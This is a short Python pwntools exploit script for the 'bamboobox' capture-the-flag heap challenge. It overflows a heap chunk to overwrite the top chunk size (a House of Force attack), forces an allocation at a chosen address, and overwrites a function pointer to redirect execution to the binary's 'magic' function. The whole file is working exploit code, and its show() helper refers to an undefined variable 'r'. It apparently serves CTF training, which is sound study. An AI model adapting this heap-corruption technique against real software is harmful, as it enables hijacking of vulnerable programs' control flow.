#!/usr/bin/env python
# coding=utf-8
# author: thinkycx
# date: 2018-12-17
from pwn import *
context.local(arch='amd64', os='linux')

def additem(length, name):
    io.recvuntil("Your choice:")
    io.sendline("2")
    io.recvuntil(":")
    io.sendline(str(length))
    io.recvuntil(":")
    io.sendline(name)


def modify(idx, length, name):
    io.recvuntil("Your choice:")
    io.sendline("3")
    io.recvuntil(":")
    io.sendline(str(idx))
    io.recvuntil(":")
    io.sendline(str(length))
    io.recvuntil(":")
    io.sendline(name)


def remove(idx):
    io.recvuntil("Your choice:")
    io.sendline("4")
    io.recvuntil(":")
    io.sendline(str(idx))

def show():
    r.recvuntil("Your choice:")
    r.sendline("1")


def pwn(io):
    additem(0x50, 'thinkycx')
    if local&debug: gdb.attach(io,'set $item=0x00000000006020C8 \n break *show_item \n break *0x0000000000400E42')
    
    log.info("1. overflow")
    payload_overflow = 0x50*'a' + p64(0) + p64(0xffffffffffffffff)
    modify(0, 0x60, payload_overflow) ## should large
    
    log.info("2. malloc size")
    offset = (0x603010 - 0x10)-0x603080
    size = offset - 0x8 

    additem(size, "thinkycx") # cannot write into heap content because of size < 0

    log.info("3. malloc 0x10")
    payload_write = '11111111' + p64(elf.symbols['magic'])
    additem(0x20, payload_write) # write
    # print io.recv()

    io.sendlineafter("Your choice:","5")



if __name__ == '__main__':
    global io, elf, libc, debug
    local, debug = 1, 0
    # context.log_level = 'debug'
    filename = './bamboobox'
    elf = ELF(filename)
    if local:
        # socat tcp-l:10002,fork exec:./filename
        io = process(filename)
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        context.terminal = ['tmux', 'splitw', '-h' ]
    else:
        io = remote("ip",10001)
    pwn(io)
    io.interactive()
